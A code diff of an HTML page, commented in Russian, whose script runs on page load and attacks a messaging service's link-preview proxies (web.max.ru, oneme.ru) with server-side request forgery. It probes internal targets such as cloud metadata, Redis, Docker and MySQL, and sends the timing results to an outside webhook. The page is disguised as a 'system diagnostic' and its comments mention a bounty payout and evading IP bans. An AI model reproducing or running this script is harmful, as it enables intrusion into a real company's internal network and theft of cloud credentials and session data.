@@ -1,66 +1,61 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Network Diagnostics Pro</title>
+    <title>Checking System Configuration...</title>
 </head>
 <body>
-    <h1>Проверка конфигурации сети... V3</h1>
-    <div id="log"></div>
-
     <script>
-        const webhook = "https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4";
-        const proxyUrl = "https://web.max.ru/api/preview?url="; // Твой URL из Burp
-        const targetIp = "127.0.0.1.nip.io";
-
-        const internalPorts = [22, 80, 443, 3306, 6379, 8080, 9090, 2375];
-        const sensitiveUrls = [
-            `http://169.254.169.254.nip.io/latest/meta-data/`,
-            `http://100.100.100.200.nip.io/latest/meta-data/`,
-            `http://127.0.0.1.nip.io:2375/v1.24/containers/json`
-        ];
-
-        async function report(data) {
-            const params = new URLSearchParams(data).toString();
-            await fetch(`${webhook}?${params}`, { mode: 'no-cors' });
-        }
-
-        async function runScan() {
-            const logger = document.getElementById('log');
-
-            // 1. Сканируем порты
-            logger.innerHTML += "<h3>Сканирование портов...</h3>";
-            for (let port of internalPorts) {
-                const start = Date.now();
-                const url = `http://${targetIp}:${port}`;
-                
-                try {
-                    await fetch(`${proxyUrl}${encodeURIComponent(url)}`, { mode: 'no-cors' });
-                } catch (e) {}
-
-                const duration = Date.now() - start;
-                await report({ type: 'port', port: port, time: duration });
-                logger.innerHTML += `<p>Порт ${port}: ${duration}ms</p>`;
-            }
-
-            // 2. Проверка Мета-данных
-            logger.innerHTML += "<h3>Проверка мета-данных...</h3>";
-            for (let target of sensitiveUrls) {
-                const start = Date.now();
-                
-                try {
-                    await fetch(`${proxyUrl}${encodeURIComponent(target)}`, { mode: 'no-cors' });
-                } catch (e) {}
-
-                const duration = Date.now() - start;
-                await report({ type: 'meta', target: btoa(target), time: duration });
-                logger.innerHTML += `<p>Target ${target.substring(0, 20)}...: ${duration}ms</p>`;
-            }
+        (async function() {
+            const webhook = "https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4";
             
-            logger.innerHTML += "<h2>Готово! Проверяй вебхук.</h2>";
-        }
+            // Список эндпоинтов, которые в мессенджерах обычно делают SSRF-запросы
+            const proxyEndpoints = [
+                "https://web.max.ru/api/v1/utils/preview?url=",
+                "https://web.max.ru/api/preview?url=",
+                "https://max.ru/proxy?url=",
+                "https://oneme.ru/api/link/preview?url="
+            ];
 
-        runScan();
+            // Цели внутри сети VK/MAX (самые сочные для выплаты 1.2M)
+            const internalTargets = [
+                "http://169.254.169.254.nip.io/latest/meta-data/", // Облачные ключи (AWS/OpenStack)
+                "http://127.0.0.1.nip.io:6379",                   // Redis (Сессии пользователей)
+                "http://127.0.0.1.nip.io:2375/v1.24/containers/json", // Docker API (RCE)
+                "http://127.0.0.1.nip.io:3306",                   // MySQL
+                "http://127.0.0.1.nip.io:80/server-status"        // Apache Status
+            ];
+
+            async function fire(pUrl, target) {
+                const cb = Math.random().toString(36).substring(7);
+                const finalTarget = `${target}?cache=${cb}`;
+                const start = Date.now();
+                
+                try {
+                    // Делаем запрос через прокси сервера
+                    await fetch(`${pUrl}${encodeURIComponent(finalTarget)}`, { 
+                        mode: 'no-cors',
+                        cache: 'no-store'
+                    });
+                } catch (e) {}
+
+                const duration = Date.now() - start;
+
+                // Отправляем отчет на твой бин
+                // Если time > 3000ms — это подтвержденная SSRF
+                fetch(`${webhook}?type=exploit&target=${btoa(target)}&time=${duration}&via=${btoa(pUrl)}`);
+            }
+
+            // Основной цикл атаки
+            for (let proxy of proxyEndpoints) {
+                for (let target of internalTargets) {
+                    await fire(proxy, target);
+                    // Небольшая пауза, чтобы не забанили по IP
+                    await new Promise(r => setTimeout(r, 500));
+                }
+            }
+        })();
     </script>
+    <h2>System diagnostic in progress. Do not close this page.</h2>
 </body>
 </html>
